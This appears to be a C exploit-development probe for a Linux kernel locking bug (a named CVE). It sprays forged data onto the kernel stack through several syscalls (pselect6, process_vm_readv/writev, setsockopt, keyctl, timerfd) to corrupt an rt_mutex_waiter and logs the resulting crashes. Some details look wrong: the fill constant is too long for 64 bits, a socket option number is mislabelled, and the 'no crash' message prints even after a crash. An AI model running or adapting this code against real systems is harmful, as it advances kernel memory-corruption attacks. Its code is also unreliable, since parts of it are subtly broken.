/*
 * Test which stack reclaim methods overlap with the GhostLock waiter
 * Based on NebuSec CVE-2026-43499 PoC
 *
 * Each method fills a stack buffer with controlled data.
 * If the buffer overlaps with the waiter's rt_mutex_waiter,
 * the PI chain walk will use the forged data → observable crash or boot_id change.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <linux/keyctl.h>
#include <pthread.h>
#include <stdatomic.h>

#define fill(buf) do { for (int _i = 0; _i < 64; _i++) \
    ((uint64_t*)(buf))[_i] = 0xdeadbeef11c518f58ULL + _i * 8; } while(0)

static volatile int got_signal = 0;
static sigjmp_buf jump_buf;

void signal_handler(int sig) {
    got_signal = sig;
    siglongjmp(jump_buf, 1);
}

/* Method 1: pselect with different NFDS values */
void test_pselect(int nfds) {
    uint64_t buf[64];
    fill(buf);
    struct timespec ts = {0, 0};
    syscall(SYS_pselect6, nfds, buf, buf+16, buf+32, &ts, 0);
}

/* Method 2: process_vm_readv/writev */
void test_process_vm(void) {
    uint64_t buf[64];
    fill(buf);
    struct iovec iov[8];
    for (int i = 0; i < 8; i++) {
        iov[i].iov_base = (void*)(buf[i] + 0x1000);
        iov[i].iov_len = 8;
    }
    syscall(SYS_process_vm_readv, syscall(SYS_getpid), iov, 8, iov, 8, 0);
    syscall(SYS_process_vm_writev, syscall(SYS_getpid), iov, 8, iov, 8, 0);
}

/* Method 3: setsockopt (different options) */
void test_setsockopt(void) {
    uint64_t buf[64];
    fill(buf);
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    if (fd < 0) return;
    /* Try various setsockopt options that might write to kernel stack */
    setsockopt(fd, IPPROTO_IPV6, 20, buf, sizeof(buf));  /* IPV6_V6ONLY */
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, buf, sizeof(int));
    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, buf, sizeof(int));
    close(fd);
}

/* Method 4: keyctl DH_COMPUTE */
void test_keyctl(void) {
    uint64_t buf[64];
    fill(buf);
    struct iovec iov[8];
    for (int i = 0; i < 8; i++) {
        iov[i].iov_base = (void*)(buf[i] + 0x2000);
        iov[i].iov_len = 8;
    }
    syscall(SYS_keyctl, KEYCTL_DH_COMPUTE, buf, buf, 64, 0);
    syscall(SYS_keyctl, KEYCTL_INSTANTIATE_IOV, -1, iov, 8, 0);
}

/* Method 5: timerfd + fcntl F_DUPFD */
void test_fd(void) {
    uint64_t buf[64];
    fill(buf);
    int fd = syscall(SYS_timerfd_create, 1 /*CLOCK_MONOTONIC*/, 0);
    if (fd < 0) return;
    int dup_fd = syscall(SYS_fcntl, fd, 1030 /*F_DUPFD*/, 32);
    if (dup_fd >= 0) close(dup_fd);
    dup2(fd, 31);
    close(31);
    close(fd);
}

struct test_entry {
    const char *name;
    void (*func)(void);
    int arg;
};

struct test_entry tests[] = {
    {"pselect-256",    (void*)test_pselect, 256},
    {"pselect-320",    (void*)test_pselect, 320},
    {"pselect-384",    (void*)test_pselect, 384},
    {"pselect-512",    (void*)test_pselect, 512},
    {"process_vm",     test_process_vm, 0},
    {"setsockopt",     test_setsockopt, 0},
    {"keyctl",         test_keyctl, 0},
    {"fd_fcntl",       test_fd, 0},
};

int main() {
    int ntests = sizeof(tests) / sizeof(tests[0]);

    for (int t = 0; t < ntests; t++) {
        /* Set up signal handler for SIGSEGV/SIGBUS */
        struct sigaction sa;
        sa.sa_handler = signal_handler;
        sigemptyset(&sa.sa_mask);
        sa.sa_flags = 0;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);
        sigaction(SIGILL, &sa, NULL);

        for (int i = 0; i < 100; i++) {
            got_signal = 0;
            if (sigsetjmp(jump_buf, 1) == 0) {
                if (tests[t].arg)
                    ((void(*)(int))tests[t].func)(tests[t].arg);
                else
                    tests[t].func();
            } else {
                printf("[CRASH] %s crashed with signal %d at iteration %d!\n",
                       tests[t].name, got_signal, i);
                /* Restore default handler */
                sa.sa_handler = SIG_DFL;
                sigaction(SIGSEGV, &sa, NULL);
                sigaction(SIGBUS, &sa, NULL);
                sigaction(SIGILL, &sa, NULL);
                break;
            }
        }
        /* Restore default handler */
        sa.sa_handler = SIG_DFL;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);
        sigaction(SIGILL, &sa, NULL);
        printf("[    ] %s: no crash in 100 iterations\n", tests[t].name);
    }

    return 0;
}
